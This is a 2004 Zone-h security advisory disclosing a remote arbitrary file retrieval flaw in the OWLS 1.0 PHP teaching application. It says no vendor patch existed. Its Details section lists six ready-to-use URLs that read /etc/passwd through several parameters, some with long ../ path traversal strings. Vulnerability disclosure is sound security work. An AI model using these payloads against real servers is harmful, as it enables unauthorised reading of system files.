ZH2004-08SA (security advisory): OWLS 1.0 Remote arbitrary files retrieving

Discovered: 05 january 2004

Vendor contacted: 07 january 2004

Published: 18 february 2004

Name: OWLS

Affected Systems: 1.0

Issue: Remote file retrieving

Author: G00db0y from Zone-h Security Labs - g00db0y@zone-h.org - zetalabs@zone-h.org

Vendor: <http://www.foolsworkshop.com/owls/>

Description

***********

Zone-h Security Team has discovered a flaw in OWLS 1.0. There is a vulnerability in \
the current version of OWLS that allows an attacker to retrieve arbitrary files from \
the webserver with its priviledges. "OWLS is a web-based environment for instructors \
of language to easily create exercises, readings, glossaries, and present media for \
their students. Once installed on a web server that supports PHP, instructors can \
create materials or upload media for presentation to their students through a simple \
form based interface"

Details

*******

It's possibile for a remote attacker to retrieve any file from a webserver. Multiple \
files are affected with this problem.

For example try this:

<http://address/owls/glossaries/index.php?file=/etc/passwd>

<http://address/owls/multiplechoice/index.php?file=../../../../../../../../../../../../../../../etc/passwd&view=print>

<http://address/owls/readings/index.php?filename=/etc/passwd>

<http://address/owls/multiplechoice/resultsignore.php?filename=/etc/passwd>

<http://address/owls/workshop/glossary.php?editfile=../../../../../../../../../../../../../../../etc/passwd>

<http://address/owls/workshop/newmultiplechoice.php?edit=1&editfile=../../../../../../../../../../../../../../../etc/passwd>

Solution:

*********

The vendor has been contacted and a patch was not yet produced.
